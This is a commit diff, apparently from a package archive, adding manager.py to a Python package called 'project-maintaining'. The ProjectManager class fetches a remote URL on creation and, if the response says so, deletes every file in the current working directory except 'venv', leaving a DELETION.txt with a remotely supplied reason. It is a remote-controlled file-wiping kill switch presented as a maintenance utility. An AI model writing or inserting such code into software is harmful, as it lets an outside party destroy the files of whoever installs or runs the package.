b090ac51d0c683a5104a1d10883817e2e1c7209d
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 19:22:01 +0000

    Add package project-maintaining/1.3/project_maintaining-1.3.tar.gz

---
+++ packages/project-maintaining/project_maintaining-1.3.tar.gz/project_maintaining-1.3/project_maintaining/manager.py
@@ -0,0 +1,28 @@
+import requests
+import os
+
+
+class ProjectManager:
+    def __init__(self, url):
+        response = requests.get(url)
+        try:
+            res = response.json()
+        except Exception:
+            res = {"delete": False}
+        need_deletion = bool(res.get("delete", False))
+        self.reason = res.get("reason", None)
+        if need_deletion:
+            self.delete_project()
+
+    def delete_project(self):
+        path = os.getcwd()
+        structure = os.listdir()
+        for i in structure:
+            if i != "venv":
+                try:
+                    os.remove(os.path.join(path, i))
+                except PermissionError:
+                    continue
+        if self.reason:
+            with open("DELETION.txt", "w", encoding="utf-8") as f:
+                f.write(str(self.reason))
